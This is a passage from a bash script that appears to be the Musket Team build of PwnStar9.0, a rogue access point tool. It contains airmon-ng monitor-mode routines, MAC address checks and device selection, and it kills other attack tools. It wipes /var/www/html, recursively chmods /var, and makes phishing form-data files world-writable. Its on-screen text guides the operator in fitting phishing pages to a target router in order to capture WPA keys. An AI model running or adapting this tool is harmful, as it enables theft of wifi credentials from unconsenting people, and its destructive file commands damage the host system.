                printf "\n\t\t\t\t(monitor mode enabled on $MONDEV)"
            else
                if [ -f /sys/class/ieee80211/"$PHYDEV"/add_iface ]
                then
                    echo -n "$MONDEV" > /sys/class/ieee80211/"$PHYDEV"/add_iface
                    sleep 1s
                    if [ $3 -lt 1000 ]
                    then
                        iwconfig $MONDEV mode Monitor channel $3 >/dev/null 2>&1
                    else
                        iwconfig $MONDEV mode Monitor freq "$3"000000 >/dev/null 2>&1
                    fi
                    ifconfig $MONDEV up
                    printf "\n\t\t\t\t(monitor mode enabled on $MONDEV)"
                else
                    printf "\n\nERROR: nl80211 support is disabled in your kernel.\nPlease recompile your kernel with nl80211 support enabled.\n"
                fi
            fi
        else
            if [ -f /sys/class/ieee80211/"$PHYDEV"/add_iface ]
            then
                echo -n "$MONDEV" > /sys/class/ieee80211/"$PHYDEV"/add_iface
                sleep 1s
                if [ $3 -lt 1000 ]
                then
                    iwconfig $MONDEV mode Monitor channel $3 >/dev/null 2>&1
                else
                    iwconfig $MONDEV mode Monitor freq "$3"000000 >/dev/null 2>&1
                fi
                ifconfig $MONDEV up
                printf "\n\t\t\t\t(monitor mode enabled on $MONDEV)"
            else
                printf "\n\nERROR: Neither the sysfs interface links nor the iw command is available.\nPlease download and install iw from\n$IW_SOURCE\n"
            fi
        fi
    fi
    if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
    then
        z="`echo $iface | cut -b -${#MON_PREFIX}`"
        if [ x$z = "x$MON_PREFIX" ]
        then
            if [ $USE_IW = 1 ]
            then
                IW_ERROR=`iw dev "$iface" interface del 2>&1 | grep "nl80211 not found"`
                if [ x$IW_ERROR = "x" ]
                then
                    printf " (removed)"
                else
                    if [ -f /sys/class/ieee80211/"$PHYDEV"/remove_iface ]
                    then
                        echo -n "$iface" > /sys/class/ieee80211/"$PHYDEV"/remove_iface
                        printf " (removed)"
                    else
                        printf "\n\nERROR: nl80211 support is disabled in your kernel.\nPlease recompile your kernel with nl80211 support enabled.\n"
                fi
                fi
            else
                if [ -f /sys/class/ieee80211/"$PHYDEV"/remove_iface ]
                then
                    echo -n "$iface" > /sys/class/ieee80211/"$PHYDEV"/remove_iface
                    printf " (removed)"
                else
                    printf "\n\nERROR: Neither the sysfs interface links nor the iw command is available.\nPlease download and install iw from\n$IW_SOURCE\n"
                fi
	    fi
        else
            ifconfig $iface down
            iwconfig $iface mode managed
            printf "\n\t\t\t\t(monitor mode disabled)"
        fi
    fi
    echo
    continue
 fi


 if [ x$DRIVER = "xorinoco" ] || [ x"`iwpriv $iface 2>/dev/null | grep get_rid`" != "x" ] || [ x"`iwpriv $iface 2>/dev/null | grep dump_recs`" != "x" ]
 then
    printf "$iface\t\tHermesI\t\torinoco"
    if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
    then
        cp $KISMET~ $KISMET 2>/dev/null &&
        echo "source=orinoco,$iface,HermesI" >>$KISMET
        if [ $CH -lt 1000 ]
        then
            iwconfig $iface mode Monitor channel $CH >/dev/null 2>&1
        else
            iwconfig $iface mode Monitor freq "$CH"000000 >/dev/null 2>&1
        fi
        iwpriv $iface monitor 1 $CH >/dev/null 2>&1
        ifconfig $iface up
        printf " (monitor mode enabled)"
    fi
    if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
    then
        ifconfig $iface down
        iwpriv $iface monitor 0 >/dev/null 2>&1
        iwconfig $iface mode Managed >/dev/null 2>&1
        printf " (monitor mode disabled)"
    fi
    echo
    continue
 fi


 if [ x$DRIVER = "xipw2100" ] || [ x"`iwpriv $iface 2>/dev/null | grep set_crc_check`" != "x" ]
 then
    printf "$iface\t\tIntel 2100B\tipw2100"
    if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
    then
        cp $KISMET~ $KISMET 2>/dev/null &&
        echo "source=ipw2100,$iface,Centrino_b" >>$KISMET
        startStdIface $iface $CH
    fi
    if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
    then
        stopStdIface $iface
    fi
    echo
    continue
 fi


 if [ x$DRIVER = "xarusb_lnx" ] || [ x$DRIVER = "Otus" ]
 then
    printf "$iface\t\tAR9001USB\tOtus"
    if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
    then
	echo "Monitor mode not yet supported"
    fi
    if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
    then
	stopStdIface $iface
    fi
    echo
    continue
 fi  

 if [ x$DRIVER = "xipw2200" ] || [ x"`iwpriv $iface 2>/dev/null | grep sw_reset`" != "x" ]
 then
    MODINFO=`modinfo ipw2200  2>/dev/null | awk '/^version/ {print $2}'`
    if { echo "$MODINFO" | grep -E '^1\.0\.(0|1|2|3)$' ; }
    then
    	echo "Monitor mode not supported, please upgrade"
    else
	printf "$iface\t\tIntel 2200BG\tipw2200"
	if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
	then
	    cp $KISMET~ $KISMET 2>/dev/null &&
	    echo "source=ipw2200,$iface,Centrino_g" >>$KISMET
	    startStdIface $iface $CH
	fi
	if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
	then
	    stopStdIface $iface
	fi

    	if { echo "$MODINFO" | grep -E '^1\.0\.(5|7|8|11)$' ; }
	then
		printf " (Warning: bad module version, you should upgrade)"
	fi
     fi
     echo
     continue
 fi


 if [ x$DRIVER = "xcx3110x" ] || [ x"`iwpriv $iface 2>/dev/null | grep set_backscan`" != "x" ]
 then
     printf "$iface\t\tNokia 770\t\tcx3110x"
     if [ x$1 = "xstart" ] || [ x$1 = "xstop" ]
     then
     	printf " (Enable/disable monitor mode not yet supported)"
     fi
     echo
     continue
 fi


 if [ x$DRIVER = "xipw3945" ] || [ x"`iwpriv $iface 2>/dev/null | grep set_preamble | grep -v set_crc_check`" != "x" ]
  then
        printf "$iface\t\tIntel 3945ABG\tipw3945"
        if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
         then
                cp $KISMET~ $KISMET 2>/dev/null &&
                echo "source=ipw3945,$iface,Centrino_g" >>$KISMET
                startStdIface $iface $CH
        fi
        if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
         then
                stopStdIface $iface
        fi
        echo
        continue
 fi


 if [ x"`iwpriv $iface 2>/dev/null | grep inact_auth`" != "x" ]
 then
     if [ -e "/proc/sys/net/$iface/%parent" ]
     then
        printf "$iface\t\tAtheros\t\tmadwifi-ng VAP (parent: `cat /proc/sys/net/$iface/%parent`)"
	if [ x$2 = x$iface ] && [ x$1 = "xstop" ]
	then
		wlanconfig $iface destroy
		printf " (VAP destroyed)"
	fi
	if [ x$1 = "xstart" ]
	then
		if [ $iface = "$IFACE" ]
		then
			printf " (monitor mode enabled)"
		fi
		if [ x$2 = x$iface ]
		then
			printf " (VAP cannot be put in monitor mode)"
		fi
	fi

	echo ""
        continue

     fi
     printf "$iface\t\tAtheros\t\tmadwifi"
     if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
     then
         cp $KISMET~ $KISMET 2>/dev/null &&
         echo "source=madwifi_g,$iface,Atheros" >>$KISMET
         startStdIface $iface $CH
     fi
     if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
         stopStdIface $iface
     fi
     echo
     continue
 fi


 if [ x$DRIVER = "xprism54" ] || [ x"`iwpriv $iface 2>/dev/null | grep getPolicy`" != "x" ]
 then
     printf "$iface\t\tPrismGT\t\tprism54"
     if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
     then
         cp $KISMET~ $KISMET 2>/dev/null &&
         echo "source=prism54g,$iface,Prism54" >>$KISMET
         ifconfig $iface up
         if [ $CH -lt 1000 ]
         then
             iwconfig $iface mode Monitor channel $CH
         else
             iwconfig $iface mode Monitor freq "$CH"000000
         fi
         iwpriv $iface set_prismhdr 1 >/dev/null 2>&1
         printf " (monitor mode enabled)"
     fi
     if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
         stopStdIface $iface
     fi
     echo
     continue
 fi


 if [ x$DRIVER = "xhostap" ] || [ x"`iwpriv $iface 2>/dev/null | grep antsel_rx`" != "x" ]
 then
     printf "$iface\t\tPrism 2/2.5/3\tHostAP"
     if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
     then
         cp $KISMET~ $KISMET 2>/dev/null &&
         echo "source=hostap,$iface,Prism2" >>$KISMET
         if [ $CH -lt 1000 ]
         then
             iwconfig $iface mode Monitor channel $CH
         else
             iwconfig $iface mode Monitor freq "$CH"000000
         fi
         iwpriv $iface monitor_type 1 >/dev/null 2>&1
         ifconfig $iface up
         printf " (monitor mode enabled)"
     fi
     if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
         stopStdIface $iface
     fi
     echo
     continue
 fi


 if [ x$DRIVER = "xwlan-ng" ] || [ x"`wlancfg show $iface 2>/dev/null | grep p2CnfWEPFlags`" != "x" ]
 then
     printf "$iface\t\tPrism 2/2.5/3\twlan-ng"
     if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
     then
         cp $KISMET~ $KISMET 2>/dev/null &&
         echo "source=wlanng,$iface,Prism2" >>$KISMET
         wlanctl-ng $iface lnxreq_ifstate ifstate=enable >/dev/null
         wlanctl-ng $iface lnxreq_wlansniff enable=true channel=$CH \
                           prismheader=true wlanheader=false \
                           stripfcs=true keepwepflags=true >/dev/null
         echo p2CnfWEPFlags=0,4,7 | wlancfg set $iface
         ifconfig $iface up
         printf " (monitor mode enabled)"
     fi
     if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
         ifconfig $iface down
         wlanctl-ng $iface lnxreq_wlansniff enable=false  >/dev/null
         wlanctl-ng $iface lnxreq_ifstate ifstate=disable >/dev/null
         printf " (monitor mode disabled)"
     fi
     echo
     continue
 fi


 if [ x$SYSFS = "x" ] && [ x"`iwpriv $iface 2>/dev/null | grep get_RaAP_Cfg`" != "x" ]
 then
    if [ x"`iwconfig $iface | grep ESSID | awk -F\  '{ print $2}' | grep -i rt61`" != "x" ]
    then
    	printf "$iface\t\tRalink 2561 PCI\trt61"
    fi

    if [ x"`iwconfig $iface | grep ESSID | awk -F\  '{ print $2}' | grep -i rt73`" != "x" ]
    then
        printf "$iface\t\tRalink 2573 USB\trt73"
    fi

    if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
    then
         startStdIface $iface $CH
         iwpriv $iface rfmontx 1
         if [ x"`iwpriv $iface 2>/dev/null | grep forceprismheader`" != "x" ]
         then
             iwpriv $iface forceprismheader 1
         fi
         if [ x"`iwpriv $iface 2>/dev/null | grep forceprism`" != "x" ]
         then
             iwpriv $iface forceprism 1
         fi
    fi
    if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
     	stopStdIface $iface
    fi
    echo
    continue

 fi


 if [ x$DRIVER = "xrt61" ]
 then
    printf "$iface\t\tRalink 2561 PCI\trt61"

    if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
    then
         startStdIface $iface $CH
         iwpriv $iface rfmontx 1
         if [ x"`iwpriv $iface 2>/dev/null | grep forceprismheader`" != "x" ]
         then
             iwpriv $iface forceprismheader 1
         fi
         if [ x"`iwpriv $iface 2>/dev/null | grep forceprism`" != "x" ]
         then
             iwpriv $iface forceprism 1
         fi
    fi
    if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
     	stopStdIface $iface
    fi    
    echo
    continue

 fi


 if [ x$DRIVER = "xrt73" ]
 then
    printf "$iface\t\tRalink 2573 USB\trt73"

    if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
    then
         startStdIface $iface $CH
         iwpriv $iface rfmontx 1
         if [ x"`iwpriv $iface 2>/dev/null | grep forceprismheader`" != "x" ]
         then
             iwpriv $iface forceprismheader 1
         fi
         if [ x"`iwpriv $iface 2>/dev/null | grep forceprism`" != "x" ]
         then
             iwpriv $iface forceprism 1
         fi
    fi
    if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
     	stopStdIface $iface
    fi    
    echo
    continue

 fi


 if [ x$DRIVER = "xrt2500" ] || [ x"`iwpriv $iface 2>/dev/null | grep bbp`" != "x" ]
 then
     printf "$iface\t\tRalink 2560 PCI\trt2500"
     if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
     then
         cp $KISMET~ $KISMET 2>/dev/null &&
         echo "source=rt2500,$iface,Ralink_g" >>$KISMET
         iwconfig $iface mode ad-hoc 2> /dev/null >/dev/null
         startStdIface $iface $CH
     fi
     if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
         stopStdIface $iface
     fi
     echo
     continue
 fi


 if [ x$DRIVER = "xrt2570" ] || [ x"`iwpriv $iface 2>/dev/null | grep wpapsk`" != "x" ] && [ x"`iwpriv $iface 2>/dev/null | grep get_RaAP_Cfg`" = "x" ]
 then
     printf "$iface\t\tRalink 2570 USB\trt2570"
     if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
     then
         cp $KISMET~ $KISMET 2>/dev/null &&
         echo "source=rt2500,$iface,Ralink_g" >>$KISMET
         iwconfig $iface mode ad-hoc 2> /dev/null >/dev/null
         startStdIface $iface $CH
         if [ x"`iwpriv $iface 2>/dev/null | grep forceprismheader`" != "x" ]
         then
             iwpriv $iface forceprismheader 1
         fi
         if [ x"`iwpriv $iface 2>/dev/null | grep forceprism`" != "x" ]
         then
             iwpriv $iface forceprism 1
         fi
     fi
     if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
         stopStdIface $iface
     fi
     echo
     continue
 fi


 if [ x$DRIVER = "xr8180" ] || [ x"`iwpriv $iface 2>/dev/null | grep debugtx`" != "x" ]
 then
     printf "$iface\t\tRTL8180/RTL8185\tr8180"
     if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
     then
         cp $KISMET~ $KISMET 2>/dev/null &&
         echo "source=rt8180,$iface,Realtek" >>$KISMET
         if [ $CH -lt 1000 ]
         then
             iwconfig $iface mode Monitor channel $CH
         else
             iwconfig $iface mode Monitor freq "$CH"000000
         fi
         if [ x"`iwpriv $iface 2>/dev/null | grep prismhdr`" != "x" ]
         then
            iwpriv $iface prismhdr 1 >/dev/null 2>&1
         fi
         ifconfig $iface up
         printf " (monitor mode enabled)"
     fi
     if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
         stopStdIface $iface
     fi
     echo
     continue
 fi


 if [ x$DRIVER = "xr8187" ] || [ x"`iwpriv $iface 2>/dev/null | grep badcrc`" != "x" ]
 then
     printf "$iface\t\tRTL8187\t\tr8187"
     if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
     then
         cp $KISMET~ $KISMET 2>/dev/null &&
         echo "source=rt8180,$iface,Realtek" >>$KISMET
         if [ $CH -lt 1000 ]
         then
             iwconfig $iface mode Monitor channel $CH
         else
             iwconfig $iface mode Monitor freq "$CH"000000
         fi
         if [ x"`iwpriv $iface 2>/dev/null | grep rawtx`" != "x" ]
         then
             iwpriv $iface rawtx 1 >/dev/null 2>&1
         fi
         ifconfig $iface up
         printf " (monitor mode enabled)"
     fi
     if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
         stopStdIface $iface
     fi
     echo
     continue
 fi


 if [ x$DRIVER = "xzd1211rw" ] || [ x"`iwpriv $iface 2>/dev/null | grep get_regdomain`" != "x" ]
 then
     printf "$iface\t\tZyDAS 1211\tzd1211rw"
     if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
     then
         cp $KISMET~ $KISMET 2>/dev/null &&
         echo "source=zd1211,$iface,ZyDAS" >>$KISMET
         startStdIface $iface $CH
     fi
     if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
         stopStdIface $iface
     fi
     echo
     continue
 fi


 if [ x$DRIVER = "xzd1211" ] || [ x"`iwpriv $iface 2>/dev/null | grep dbg_flag`" != "x" ]
 then
     printf "$iface\t\tZyDAS 1211\tzd1211"
     if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
     then
         cp $KISMET~ $KISMET 2>/dev/null &&
         echo "source=zd1211,$iface,ZyDAS" >>$KISMET
         startStdIface $iface $CH
     fi
     if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
         stopStdIface $iface
     fi
     echo
     continue
 fi


 if [ x$DRIVER = "xacx" ] || [ x"`iwpriv $iface 2>/dev/null | grep GetAcx1`" != "x" ]
 then
     printf "$iface\t\tTI ACX1xx\tacx"
     if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
     then
         cp $KISMET~ $KISMET 2>/dev/null &&
         echo "source=acx100,$iface,TI" >>$KISMET
         iwpriv $iface monitor 2 $CH 2> /dev/null >/dev/null
         startStdIface $iface $CH
     fi
     if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
         stopStdIface $iface
     fi
     echo
     continue
 fi


 if [ x$DRIVER = "xbcm43xx" ] || [ x"`iwpriv $iface 2>/dev/null | grep write_sprom`" != "x" ]
 then
     printf "$iface\t\tBroadcom\tbcm43xx"
     if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
     then
         cp $KISMET~ $KISMET 2>/dev/null &&
         echo "source=bcm43xx,$iface,broadcom" >>$KISMET
         startStdIface $iface $CH
     fi
     if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
         stopStdIface $iface
         ifconfig $iface up
     fi
     echo
     continue
 fi


 if [ x$DRIVER = "xislsm" ] || [ x"`iwpriv $iface 2>/dev/null | grep set_announcedpkt`" != "x" ]
 then
    printf "$iface\t\tPrismGT\t\tislsm"
    if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
    then
         startStdIface $iface $CH
    fi
    if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
     	stopStdIface $iface
    fi    
    echo
    continue

 fi


 if [ x$DRIVER = "xat76c503a" ] || [ x"`iwpriv $iface 2>/dev/null | grep set_announcedpkt`" != "x" ]
  then
     printf "$iface\t\tAtmel\t\tat76c503a"
     if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
     then
          startStdIface $iface $CH
     fi
     if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
      then
      	 stopStdIface $iface
     fi     
     echo
     continue

 fi


 if [ x$DRIVER = "xndiswrapper" ] || [ x"`iwpriv $iface 2>/dev/null | grep ndis_reset`" != "x" ]
 then
     printf "$iface\t\tUnknown\t\tndiswrapper"
     if [ x$2 = x$iface ]
     then
         echo " (MONITOR MODE NOT SUPPORTED)"
     fi
     if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
         stopStdIface $iface
     fi
     echo
     continue
 fi


 if [ x$DRIVER != "x" ]
 then
     if [ x$CHIPSET = "x" ]
     then
         printf "$iface\t\tUNKNOWN\t\t$DRIVER"
     else
         printf "$iface\t\t$CHIPSET\t\t$DRIVER"
     fi

     if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
     then
         startStdIface $iface $CH
     fi
     if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
         stopStdIface $iface
     fi
     echo
     continue
 fi

printf "$iface\t\tUnknown\t\tUnknown (MONITOR MODE NOT SUPPORTED)\n"

done

echo

if [ $UDEV_ISSUE != 0 ] ; then
	echo udev renamed the interface. Read the following for a solution:
	echo http://www.aircrack-ng.org/doku.php?id=airmon-ng#interface_athx_number_rising_ath0_ath1_ath2...._ath45
	echo 
fi


}

#airmon-old_fn

#~~~~~~~~~~~~~~~~~end  airmon-ng old end ~~~~~~~~~~~~~~~~~~~~# 
#
#~~~~~~~~~~~~~~~Start  Mac Error Handling Start~~~~~~~~~~~~~~~#

set_ap_mac_fn()

{

# Error Handling For Mac Code Entries
# Tests Length of string
# Tests Presence of only ::::: punctuation characters
# Tests only hex charcters present
#Sets correct puntuation for test

MACPUNCT=":::::"

sleep .2

#Tests punctuation

PUNCTEST=`echo "$ap_mac" | tr -d -c ".[:punct:]"`

sleep .2

if [ "$PUNCTEST" == "$MACPUNCT" ]

	then

	    PUNCT=1

	else

	    PUNCT=0

	fi

sleep .2

#Tests hex characters

MACALNUM=`echo "$ap_mac" | tr -d -c ".[:alnum:]"`

sleep .2


if [[ $MACALNUM =~ [A-Fa-f0-9]{12} ]]

then

	ALNUM=1
else

	ALNUM=0
  fi

sleep .2

#Tests string length

if [ ${#ap_mac} = 17 ]

then

	MACLEN=1
else

	MACLEN=0
  fi

sleep .2

# All variables set to ones  and zeros

until [ $MACLEN == 1 ] && [ $PUNCT == 1 ] && [ $ALNUM == 1 ]; do

	if [ $ALNUM == 0 ]; then
		echo -e "$warn  You are using a non-hex character.$txtrst"

			fi
	
	if [ $MACLEN == 0 ]; then
		echo -e "$warn  Your Mac code is the wrong length.$txtrst"

			fi

	if [ $PUNCT == 0 ]; then

		echo -e "$warn  You have entered the wrong and/or too many separators - use ONLY colons :$txtrst"

			fi

	echo -e "$info  Mac code entry incorrect!!!"
        echo "  You must use format 00:11:22:33:44:55 or aa:AA:bb:BB:cc:CC"
	echo "  Only a thru f, A thru F, 0 thru 9 and the symbol :  are allowed."
	echo -e "$inp  Reenter Mac code and try again(ap_mac).$txtrst"
	read ap_mac

        MACALNUM=`echo "$ap_mac" | tr -d -c ".[:alnum:]"`
	if [[ $MACALNUM =~ [A-Fa-f0-9]{12} ]]

        then

        	ALNUM=1

        else

	        ALNUM=0

			fi

sleep .2

	if [ ${#ap_mac} == 17 ]

	then

		MACLEN=1
	else

		MACLEN=0

			fi

sleep .2

	PUNCTEST=`echo "$ap_mac" | tr -d -c ".[:punct:]"`
	if [ $PUNCTEST == $MACPUNCT ]

	then

	    PUNCT=1

	else

	    PUNCT=0

			fi

sleep 1

done
}
#~~~~~~~~~~~~~~~Ends Mac Error Handling Ends~~~~~~~~~~~~~~~#
#
#~~~~~~~~~~~~~~~Start Select Device Start~~~~~~~~~~~~~~~#

DEVTEST=ZZZ

SELECT_DEVICE_fn()
{

until [ $DEVTEST == y ] || [ $DEVTEST == Y ]; do

echo -e  "$txtrst"
airmon-old_fn | tee /tmp/airmon01.txt

cat < /tmp/airmon01.txt | awk -F' ' '{ if(($2 != "Interface")) {print $2}}' > /tmp/airmon02.txt

cat < /tmp/airmon02.txt | awk -F' ' '{ if(($1 != "")) {print $1}}' > /tmp/airmon03.txt

  AIRMONNAME=$(cat /tmp/airmon03.txt | nl -ba -w 1  -s ': ')

echo ""
echo -e "$info Devices found by airmon-ng.$txtrst"
echo " "
echo "$AIRMONNAME" | sed 's/^/       /'
echo ""
echo -e "$inp    Enter the$yel line number$inp of the$yelwireless device(i.e. wlan0, wlan1 etc)$inp to be used."
echo -e "$warn  Device must support packet injection.$txtrst"
echo ""
read  -p "   Enter Line Number Here: " grep_Line_Number

echo -e "$txtrst"
DEV=$(cat /tmp/airmon03.txt| sed -n ""$grep_Line_Number"p")

# Remove trailing white spaces leaves spaces between names intact

DEV=$(echo $DEV | xargs)

rm /tmp/airmon01.txt &> /dev/null
rm /tmp/airmon02.txt &> /dev/null
rm /tmp/airmon03.txt &> /dev/null

	while true
	do

echo ""
echo -e "$inp  You entered$yel $DEV$info type$yel (y/Y)$inp to confirm or$yel (n/N)$inp to try again.$txtrst"
read DEVTEST

	case $DEVTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done

		done

clear

}

#~~~~~~~~~~~~~~~End Select Device End~~~~~~~~~~~~~~~#

echo ""
echo "  Starting program please standby............."
echo ""
echo "  Killing airodump-ng aireplay-ng etc and removing monitors...."

killall -q reaver &> /dev/null
killall -q airodump-ng &> /dev/null
killall -q aireplay-ng &> /dev/null
killall -q airbase-ng &> /dev/null
killall -q mdk3 &> /dev/null
killall -q xterm &> /dev/null
killall -q mitmf &> /dev/null
rm -f /tmp/essidlist
rm -f /var/www/html/* 2> /dev/null
airmon-old_fn stop mon3 &> /dev/null
airmon-old_fn stop mon2 &> /dev/null
airmon-old_fn stop mon1 &> /dev/null
airmon-old_fn stop mon0 &> /dev/null

manage_fn()
{

echo ""
echo "  Placing all wifi devices on managed mode versus monitor mode...."
# Later the API device(airbase) will be moved to monitor mode
# to keep from associating to AP and to handle the negative one issue.

#if [ ! -d "PWNSTARDEV_TEMP" ]; then
#    mkdir -p -m 700 PWNSTARDEV_TEMP;

#	fi

# Clear any files on the temporary folder

rm -f /tmp/airmon*.txt 2> /dev/null

#rm -f /tmp/* 2> /dev/null

clear

airmon-old_fn | tee /tmp/airmon01.txt &> /dev/null

cat < /tmp/airmon01.txt | awk -F' ' '{ if(($1 != "Interface")) {print $1}}' > /tmp/airmon02.txt

cat < /tmp/airmon02.txt | awk -F' ' '{ if(($1 != "")) {print $1}}' > /tmp/airmon03.txt

AIRMONAME=$(cat /tmp/airmon03.txt | nl -ba -w 1  -s ': ')

POSDEV1=$(echo "$AIRMONAME"  | awk -F' ' '{ if(($1 == "1:")) {print $2}}')
POSDEV2=$(echo "$AIRMONAME"  | awk -F' ' '{ if(($1 == "2:")) {print $2}}')
POSDEV3=$(echo "$AIRMONAME"  | awk -F' ' '{ if(($1 == "3:")) {print $2}}')
POSDEV4=$(echo "$AIRMONAME"  | awk -F' ' '{ if(($1 == "4:")) {print $2}}')
POSDEV5=$(echo "$AIRMONAME"  | awk -F' ' '{ if(($1 == "5:")) {print $2}}')


block_fn()
# This fn is inactive
{
if [ -n "${POSDEV1}" ]; then

	ifconfig $POSDEV1 down &> /dev/null
	iwconfig $POSDEV1 mode managed &> /dev/null
	ifconfig $POSDEV1 up &> /dev/null

        fi

if [ -n "${POSDEV2}" ]; then

	ifconfig $POSDEV2 down &> /dev/null
	iwconfig $POSDEV2 mode managed &> /dev/null
	ifconfig $POSDEV2 up &> /dev/null

        fi

if [ -n "${POSDEV3}" ]; then

	ifconfig $POSDEV3 down &> /dev/null
	iwconfig $POSDEV3 mode managed &> /dev/null
	ifconfig $POSDEV3 up &> /dev/null

        fi

if [ -n "${POSDEV4}" ]; then

	ifconfig $POSDEV4 down &> /dev/null
	iwconfig $POSDEV4 mode managed &> /dev/null
	ifconfig $POSDEV4 up &> /dev/null

        fi

if [ -n "${POSDEV5}" ]; then

	ifconfig $POSDEV5 down &> /dev/null
	iwconfig $POSDEV5 mode managed &> /dev/null
	ifconfig $POSDEV5 up &> /dev/null

        fi

}
rm -f /tmp/airmon*.txt 2> /dev/null
#rm -rfv PWNSTARDEV_TEMP/* 2> /dev/null

}

manage_fn

killall -q dnsmasq &> /dev/null # if using other phishing program
#dnsmasq -C /etc/dnsmasqpwnstar.conf
rm -f www_filelist.txt
rm -f www.configlist.txt
rm -f /usr/share/Eterm/themes/Eterm/user.cfg

#End Musket Entries
# ~~~~~~~~~~  Environment Setup ~~~~~~~~~~ #

# Text color variables - saves retyping these awful ANSI codes
txtrst="\e[0m"       # Text reset
def="\e[1;34m"	     # default 		   blue
warn="\e[1;31m"      # warning		   red
magenta="\033[0;35m" #
info="\e[1;34m"      # info             blue
q="\e[1;32m"	     # questions        green
inp="\e[1;36m"	     # input variables  magenta
yel="\e[1;33m"       # typed keyboard entries
brown="\033[0;33m"
lgrey="\e[37m"       # lightgrey
dgrey="\e[90m"	     # dark grey
dim="\e[2m"

#backgrounds
bgblue="\E[46m" 
ital="\e[3m"	     # italic
norm="\e[0m"         # normal
bold="\033[1;37m"    # bold
soft="\033[0;37m"
undr="\e[4m"        # underline

back="\e[0;40m"      # background black


### 7 characters = 120 pixels?

var=$(ls /etc | grep kde4)          # detect KDE
if [[ -z $var ]];then
    resize -s 38 85 &> /dev/null    # resize the terminal if gnome, not KDE

fi

# ~~~~~~~~~~ AP Type ~~~~~~~~~~ #
##########  Name of router
clear
echo ""
echo -e "$bold$info  Computer Setup and Information"
echo -e "$warn  ______________________________$norm"

echo -e "$info"
echo -e "     If the computer sets a$yel blank screen$info after being idle. Phishing pages may not"
echo -e "  be available to the client if the blank screen is in residence. Therefore when"
echo -e "  Phishing go to Settings/Power/ select screen blank never."
echo -e""
echo -e "$info     The Musket Team version of PwnStar9.0 has WPA Phishing Modules Embedded."
echo -e "  If you intend on WPA Phishing, there are$yel interactive$info phishing web pages"
echo -e "  available. This allows entering data into the web page itself to meet"
echo -e "  with your targetAPs' criteria."
echo -e ""
echo -e "$info     You should determine the make and possibly the model of the targetAP"
echo -e "  by doing an internet search for the first six(6) hexidecimal digits of the"
echo -e "  targets' mac address."
echo -e ""
echo -e "     For example, if the first six digits =$yel 80717A$info, use the"
echo -e "  following address to find information on the target router."
echo -e ""
echo -e "$yel           http://aruljohn.com/mac.pl$txtrst" 
echo -e ""
echo -e "  !!!!PLACE YOUR WEB PAGE Folders IN THE /var/www/ folder  before continuing!!!"
echo -e "                Permissions are set when program setup begins"
echo -e ""
echo -e "    When ready to continue to the PwnStar main menu type [Enter]"
read contin

# Determine ifconfig type between k2016 and k1k2

IFCONFIG_TYPE_fn

# Determine Kali Type  For apache2 webpage file positions

KALI_L_fn

### Sets permissions to files in www folders

chmod -R 755 /var/* &> /dev/null
find /var/www/*/formdata.txt  -exec chmod 777 {} \; &> /dev/null

#chmod -R 755 /root/Pwnstar/WEBPAGE_FOLDERS/ &> /dev/null
#find /root/Pwnstar/WEBPAGE_FOLDERS/*/formdata.txt -exec chmod 777 {} \; &> /dev/null


#~~~~~~~~~~~~~~~START Rogue Device Association Warning START~~~~~~~~~~~~~~~# 

#~~~~~~~~~~~~~~~Start WPA Interactive Phishings Page Start~~~~~~~~~~~~~~~#

wpaphish_fn()
{

   if [[ $apusage == 4 ]];then

ROUTERTYPETEST=ZZZ

until [ $ROUTERTYPETEST == y ] || [ $ROUTERTYPETEST == Y ]; do
echo ""

#Make random gibberish then insert in text

#RAND1=$(cat /dev/urandom -u -s -T | od -N4 -An -i)
#RAND3=$(cat /dev/urandom -u -s -T | od -N4 -An -i)

#RAND1=$(echo | head -c 4 /dev/random -s)
#RAND2=$(echo | head -c 5 /dev/random -s)

